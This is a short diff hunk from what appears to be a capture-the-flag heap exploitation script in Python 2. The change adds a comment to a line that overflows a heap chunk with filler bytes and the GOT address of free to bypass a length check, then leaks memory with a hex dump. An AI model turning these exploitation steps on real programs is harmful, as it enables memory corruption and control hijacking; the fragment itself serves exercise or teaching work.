@@ -118,7 +118,7 @@ if __name__ == "__main__":
     #                                            while satisfying (p + len_text < p2 - 4)                   
     #
 
-    update(3, 168+4, 'X'*168+p32(b.got['free']))
+    update(3, 168+4, 'X'*168+p32(b.got['free'])) # now, we can bypass the check, and overflow the heap chunk
     
     l = display(2)
     print hex_dump(l)
